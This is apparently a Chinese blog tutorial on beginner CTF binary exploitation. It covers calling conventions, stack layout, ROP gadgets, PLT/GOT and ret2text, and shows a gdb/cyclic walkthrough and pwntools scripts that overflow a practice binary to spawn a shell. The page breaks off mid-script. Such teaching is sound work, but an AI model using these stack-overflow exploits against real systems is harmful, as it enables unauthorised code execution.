<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>pwn入门简单ROP | MTRleed</title><meta name="keywords" content="pwn"><meta name="author" content="MTRleed"><meta name="copyright" content="MTRleed"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言pwn一直都是一件难以搞懂的事情，今天跟着前辈的脚步一起来学习一下 正文定义PWN也可译为二进制漏洞挖掘，在CTF比赛中,PWN题的目标是拿到flag，一般是在linux平台下通过二进制&#x2F;系统调用等方式编写漏洞利用脚本exp来获取对方服务器的shell，然后get到flag。总体的pwn要学很多，是个庞大的系统  基础知识不标识默认为x86架构 寄存器：12345678910x86：通用寄存器">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn入门简单ROP">
<meta property="og:url" content="https://www.mtrleed.top/post/13/index.html">
<meta property="og:site_name" content="MTRleed">
<meta property="og:description" content="前言pwn一直都是一件难以搞懂的事情，今天跟着前辈的脚步一起来学习一下 正文定义PWN也可译为二进制漏洞挖掘，在CTF比赛中,PWN题的目标是拿到flag，一般是在linux平台下通过二进制&#x2F;系统调用等方式编写漏洞利用脚本exp来获取对方服务器的shell，然后get到flag。总体的pwn要学很多，是个庞大的系统  基础知识不标识默认为x86架构 寄存器：12345678910x86：通用寄存器">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/ico.png">
<meta property="article:published_time" content="2023-10-02T16:00:00.000Z">
<meta property="article:modified_time" content="2023-11-30T08:36:28.181Z">
<meta property="article:author" content="MTRleed">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/ico.png"><link rel="shortcut icon" href="/img/aa.png"><link rel="canonical" href="https://www.mtrleed.top/post/13/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'pwn入门简单ROP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-30 16:36:28'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/js/myjs.js"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="MTRleed" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/ig.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/ico.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">MTRleed</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwn入门简单ROP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-02T16:00:00.000Z" title="发表于 2023-10-03 00:00:00">2023-10-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-30T08:36:28.181Z" title="更新于 2023-11-30 16:36:28">2023-11-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pwn入门简单ROP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>pwn一直都是一件难以搞懂的事情，今天跟着前辈的脚步一起来学习一下</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>PWN也可译为二进制漏洞挖掘，在CTF比赛中,PWN题的目标是拿到flag，一般是在linux平台下通过二进制/系统调用等方式编写漏洞利用脚本exp来获取对方服务器的shell，然后get到flag。总体的pwn要学很多，是个庞大的系统</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/pwn.jpg" alt="pwn"></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>不标识默认为x86架构</p>
<h3 id="寄存器："><a href="#寄存器：" class="headerlink" title="寄存器："></a>寄存器：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x86：</span><br><span class="line">通用寄存器</span><br><span class="line">eax,ebx,ecx,edx</span><br><span class="line">索引寄存器</span><br><span class="line">esi,edl</span><br><span class="line">堆栈指针寄存器</span><br><span class="line">esp(栈顶),ebp(栈底不移动，通常用它做偏移计算)</span><br><span class="line">函数参数传递通过栈传递，数据一般从右往左被依次压入栈中</span><br><span class="line">例如：</span><br><span class="line">int function (int a,int b,int c )&#123; &#125;   参数cba依次入栈，a在栈上层</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x86-64：</span><br><span class="line">rdi,rsi,rdx,rcx,r8,r9</span><br><span class="line">函数参数传递通过寄存器传递</span><br><span class="line">参数先找这6个寄存器传递，当参数多于6个时，第7个开始也使用栈传递，和x86一样</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>例如：同一个函数<code>my_fun(0,1,2,3,4,5,6)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">32位程序处理：</span><br><span class="line">push 6</span><br><span class="line">push 5</span><br><span class="line">push 4</span><br><span class="line">push 3</span><br><span class="line">push 2</span><br><span class="line">push 1</span><br><span class="line">push 0</span><br><span class="line">call my_fun</span><br><span class="line">从右往左被依次压入栈中</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">64位程序处理：</span><br><span class="line">push    6</span><br><span class="line">mov     r9d, 5</span><br><span class="line">mov     r8d, 4</span><br><span class="line">mov     ecx, 3</span><br><span class="line">mov     edx, 2</span><br><span class="line">mov     esi, 1</span><br><span class="line">mov     edi, 0</span><br><span class="line">call    my_fun</span><br><span class="line"></span><br><span class="line">可以看到函数的前6个参数都会放到寄存器里面，从左到右对应的是</span><br><span class="line">rdi, rsi, rdx, rcx, r8d, r9d</span><br><span class="line">如果还有更多参数的话，就会通过栈来传递</span><br></pre></td></tr></table></figure>

<p>再看另一个程序<code>read(0,buf,0x100)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">32位程序处理：</span><br><span class="line">.text:08048484                 push    100h            ; nbytes</span><br><span class="line">.text:08048489                 lea     eax, [ebp+buf]</span><br><span class="line">.text:0804848C                 push    eax             ; buf</span><br><span class="line">.text:0804848D                 push    0               ; fd</span><br><span class="line">.text:0804848F                 call    _read</span><br><span class="line">可以看到参数是从右到左入栈，先push 0x100，再push buf，最后push 0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">64位程序处理：</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 100h       ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br><span class="line">可以看到使用的是寄存器</span><br></pre></td></tr></table></figure>

<h3 id="大小端"><a href="#大小端" class="headerlink" title="大小端"></a>大小端</h3><p>数据位：<code>0x00123</code>左高右低（符合数字阅读习惯）</p>
<p>内存地址：下高上低</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大端序：高数据位存放在低地址(大尾)</span><br><span class="line"></span><br><span class="line">小端序：高数据位存放在高地址(小尾)（更符合习惯）</span><br></pre></td></tr></table></figure>

<p>小端序也为攻击提供了便利，例如：<code>0x0001234</code>栈溢出时从低地址覆盖，就会读取到<code>0x1234</code>。而如果是大端序数据存放<code>0x1234000</code>，低地址是<code>00</code>所以存在<code>0x00</code>截断，是读不到<code>0x1234</code>的</p>
<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>是一种先进后才的数据结构。在计算机里使用内存充当栈，这里使用内存中<code>10000H~1000FH</code>充当栈，</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/42.png"></p>
<h3 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/3.png"></p>
<p>来看一段代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/43.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/44.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/45.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/4.png"></p>
<p>执行流程</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/5.png"></p>
<p>简单的栈溢出：ret2text类型</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/6.png"></p>
<p>输入脏数据，覆盖print_name函数的栈帧(ebp-14)的大小，然后接上<code>system(&quot;/bin/sh&quot;)</code>的地址，覆盖(复写)到返回地址ret_addr (pop eip)上，意思就是脏数据覆盖了设置的数组的大小和ebp，然后会被默认跳转到该地址上执行对应的函数</p>
<p>简单的栈溢出：ret2shellcode类型</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/7.png"></p>
<p>shellcode集成网站<a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">Shellcodes database for study cases (shell-storm.org)</a></p>
<p>简单的栈溢出：ret2libc类型</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/8.png">    </p>
<h3 id="PWN相关名词解释"><a href="#PWN相关名词解释" class="headerlink" title="PWN相关名词解释"></a>PWN相关名词解释</h3><p><strong>ROP：</strong></p>
<blockquote>
<p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/%E5%A1%AB%E5%86%99%E5%9C%B0%E5%9D%80">走进栈溢出</a>，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p>
</blockquote>
<p><strong>ret：</strong></p>
<blockquote>
<p>汇编指令。将栈顶字单元出栈，其值赋给IP寄存器。即实现了一个程序的转移，将栈顶字单元保存的偏移地址作为下一条指令的偏移地址。<br>简单说就是从栈顶弹出返回地址到EIP寄存器中，程序转到该地址处继续执行</p>
</blockquote>
<p><strong>gadgets：</strong></p>
<blockquote>
<p>英文译为”小工具”，在32位程序中用的比较少。对64位程序进行溢出时不能再使用32位的方法，单纯的将参数压入栈即可，不放进寄存器直接执行函数显然不能达到目的，因此就需要一段代码，帮助我们把自己的参数放进寄存器后再进入函数，这段代码就是gadget</p>
<p>我们可以使用ROPgatgets工具查找<br>ROPgadget –binary ./pwn –only “pop|ret”</p>
<p>一般长这样：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/37.png">    </p>
<p>所以 所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。<br>这些gadgets一般遵循以下的形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx</span><br><span class="line">xxx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int 80h</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>反正就是一堆指令后面跟着ret，但是比较常见和常用的就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop xxx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>plt表和got表</strong></p>
<p>linux下的动态链接是通过PLT&amp;GOT来实现的</p>
<p><strong>plt表：</strong></p>
<blockquote>
<p>（Procedure Linkage Table）程序链接表</p>
<p>不是数据，而是用来获取数据段内的函数地址的<code>一小段代码</code>，位于<code>代码段</code>中<br>可执行文件里保存着<code>plt</code>表的地址</p>
</blockquote>
<p><strong>got表：</strong></p>
<blockquote>
<p>（Global Offset Table）全局偏移表</p>
<p>概念：每一个外部定义的符号*<em>在全局偏移表（</em>Global offset Table*）中有相应的条目，GOT位于ELF的数据段中，叫做GOT段。是存放函数地址的<code>数据段</code></p>
</blockquote>
<p>在动态链接技术里，程序的函数不会一开始就全部加载，而是在程序执行时才会加载，内存耗费小。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/38.png"></p>
<p>可执行文件存放着<code>plt</code>表的地址 –&gt;<code>plt</code>表指向<code>got</code>地址 –&gt; <code>got</code>表指向函数地址，相当于间接寻址的过程。但是真正的过程要稍微长一些。</p>
<p>当第一次加载需要用的函数时，<code>plt</code>会跳到这样一个函数<code>_dl_runtimw_resolve</code>（重定位函数），这个函数会到glibc库中加载函数的地址并写到<code>got</code>表中，随后再次调用指令以实现函数的调用。其中<code>got</code>表第一次被用到时并没有所需函数的地址，而是在<code>_dl_runtimw_resolve</code>函数执行后才被写入了所需函数的地址，这个过程也叫做<strong>延时加载</strong>或者<strong>惰性加载</strong>。</p>
<blockquote>
<p>注意got表：<br>got[0]: 本 ELF 动态段(dynamic 段)的装载地址<br>got[1]: 本EL的 link_map 数据结构描述符地址<br>got[2]: _dl_runtimeresolve 函数的地址<br>动态链接器在加载完ELF之后，都会将这3地址写到GOT 表的前3项</p>
</blockquote>
<p>下面跟着大佬的流程图来走一遍：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/39.png"></p>
<p>之后如果需要再次使用该函数，过程是这样的：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/40.png"></p>
<h2 id="签到题简单的ROP"><a href="#签到题简单的ROP" class="headerlink" title="签到题简单的ROP"></a>签到题简单的ROP</h2><h3 id="ret2xxx系列简介"><a href="#ret2xxx系列简介" class="headerlink" title="ret2xxx系列简介"></a>ret2xxx系列简介</h3><p>在<code>PWN</code>中 <code>ret2xxx</code>泛指的是<code>ret2text,  ret2shellcode,  ret2syscall,  ret2libc,  ret2csu</code> 其中 ret2代表着英文中的”return to” 的谐音，也就是我们可以从字面意思上知道。</p>
<p><strong>ret2text：</strong></p>
<blockquote>
<p>说白了就是对于.text节的利用 我们会使用几个程序中已有的代码来进行攻击，比如进程存在危险函数如system(“/bin”)或execv(“/bin/sh”,0,0)的片段，可以直接劫持返回地址到目标函数地址上。从而getshell。</p>
</blockquote>
<p><strong>ret2shellcode：</strong></p>
<blockquote>
<p>控制程序执行 shellcode 代码 shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell 一般来说 shellcode 需要我们自己填充</p>
</blockquote>
<p><strong>ret2syscall：</strong></p>
<blockquote>
<p>顾名思义，是指通过系统调用来得到shell</p>
</blockquote>
<p><strong>ret2libc</strong></p>
<blockquote>
<p>控制函数的执行libc中的函数，通常是返回至某个函数的plt 处或者函数的具体位置(即函数对应的got 表项的内容)。一般情况下，我们会选择执行system(“/bin/sh”)，故而此时我们需要知道system函数的地址。<br>libc是Linux下的ANSI C的函数库。ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。这个库可以根据 头文件划分为 15 个部分，其中包括：字符类型 ()、错误码()、 浮点常数 ()、数学常数 ()、标准定义 ()、 标准 I/O ()、工具函数 ()、字符串操作 ()、 时间和日期 ()、可变参数表 ()、信号 ()、 非局部跳转 ()、本地信息 ()、程序断言 ()也就是说 libc中存放的都是使用过的函数 字符串等</p>
</blockquote>
<p><strong>ret2csu</strong></p>
<blockquote>
<p>在64 位程序中，函数的前6个参数是通过寄存器传递的 但是大多数时候 我们很难找到每一个寄存器对应的gadgets 这时候 我们可以利用 x64下的 <code>__libc_csu_init</code> 中的 gadgets 这个函数是用来对 libc 进行初始化操作的 而一般的程序都会调用libc 函数 所以这个函数一定会存在</p>
</blockquote>
<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>程序执行自带的代码</p>
<p>1.使用 checksec 查看信息，32位程序，存在NX保护，这样shellcode不可执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/9.png">    </p>
<p>2.使用 ida32 打开，发现存在gets()函数（<code>gets</code>函数是一个危险函数。因为它不检查输入的字符串长度，而是以回车来判断结束，因此容易导致栈溢出漏洞的产生。）<br>还有一个<code>secure()</code>函数，里面包含<code>system(&quot;/bin/sh&quot;)</code>,一旦执行即可获取系统的shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/10.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/11.png"></p>
<p>3.所以现在的思路是使用<code>system(&quot;/bin/sh&quot;)</code>的地址去覆盖程序的返回地址。使用gdb打开程序<code>gdb ret2text</code>,另起终端使用<code>cyclic 200</code>生成200个字符(工具会给字符顺序)，gdb先执行<code>run</code>命令使程序运行起来，然后输入刚刚的200个字符回车使程序执行。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/12.png">    </p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/13.png">    </p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/14.png">    </p>
<p>4.程序报错，说明了出错的地方在两百个字符的<code>0x62616164</code>处，看他报错的意思是（跳转到0x62616164）这步出错了，意思就是没有0x62616164这个位置，那这个位置是从哪来的呢，就是我们200个有序字符其中最先溢出的第部分。那么只要知道这个0x62616164是我们输入的第几个，就可以数出来它前头有几个数字了。根据ASCII码表，又根据‘0x’是16进制的意思，可以查表得出这串数字转换成字母是‘baad’。接下来就要知道cyclic的顺序了，稍微观察一下就可以知道cyclic的规则（4个数4个数有规则），轻易的就可以数出它的位置。</p>
<p>当然还有更简单的方法，前文也说了cyclic是有序字符串，自然有一个子函数可以查，“cyclic -l”代表着查询你所给的4bit字符前有几个字母。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/15.png"></p>
<p>5.输入<code>cyclic -l 0x62616164</code>，得到112，说明‘baad’前有112个字母，那么这112个字母就是填充空栈的所需量了。接下来多的就会溢出。        <img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/16.png"></p>
<p>6.找到要被执行的<code>system(&quot;/bin/sh&quot;)</code>的地址为<code>0x0804863A</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/17.png"></p>
<p>7.所以现在只需要填满112个字符然后接上目标代码的地址即可，编写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(<span class="number">0x0804863A</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">或：</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target=<span class="number">0x0804863A</span></span><br><span class="line"><span class="comment">#即/bin/sh所在位置</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(target))</span><br><span class="line"><span class="comment">#至此就获得了系统权限</span></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#打开交互页面</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/18.png">    </p>
<p>8.退出gdb，python2输入<code>python exp.py</code>让程序运行我们的脚本</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/19.png">`</p>
<p>python3对字符的连接有要求，所以会报错<code>TypeError: can only concatenate str (not “bytes“) to str</code>，因为我们前面是字符串后面是字节，想要在python3下运行，要在字符串前加一个<code>b</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./ret2text&quot;</span>) --打远程改为 sh=remote(<span class="string">&#x27;ip&#x27;</span>, port, typ=<span 